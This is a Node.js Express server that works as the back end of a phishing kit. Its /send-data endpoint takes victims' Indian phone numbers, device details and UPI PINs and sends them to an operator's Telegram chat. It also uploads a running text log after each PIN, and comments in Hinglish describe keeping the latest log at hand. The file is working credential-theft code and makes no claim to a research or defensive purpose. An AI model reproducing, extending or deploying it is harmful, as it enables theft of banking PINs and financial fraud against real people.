require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

// State management
let lastMessageId = null;
let currentMessageText = "";
let currentDeviceModel = "Device";

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const sendFileToTelegram = async (content, filename) => {
    try {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        // File content se markdown stars (*) hata diye gaye hain
        const cleanContent = content.replace(/\*/g, '');
        form.append('document', Buffer.from(cleanContent, 'utf-8'), { filename: `${filename}.txt` });

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (error) {}
};

const startupNotification = async () => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `*BJP Client's*`,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
    
    // Model name extract (RMX3933)
    if (deviceId) {
        currentDeviceModel = deviceId.split(' ')[0] || "Device";
    }

    if (type === 'NUMBER') {
        lastMessageId = null; 
        currentMessageText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
        currentMessageText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
        currentMessageText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
        currentMessageText += `*Number:* +91 ${number}\n`;
        
        await sendOrUpdateTelegram(currentMessageText);
    } else if (pin) {
        // Naya PIN existing text mein jodo
        currentMessageText += `*UPI PIN:* ${pin}\n`;
        
        // Message edit karo
        await sendOrUpdateTelegram(currentMessageText);
        
        // Final details milne ke baad TXT file bhejo
        // Note: Ye har PIN ke baad file bhejega taaki aapke paas hamesha latest log file rahe
        await sendFileToTelegram(currentMessageText, currentDeviceModel);
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
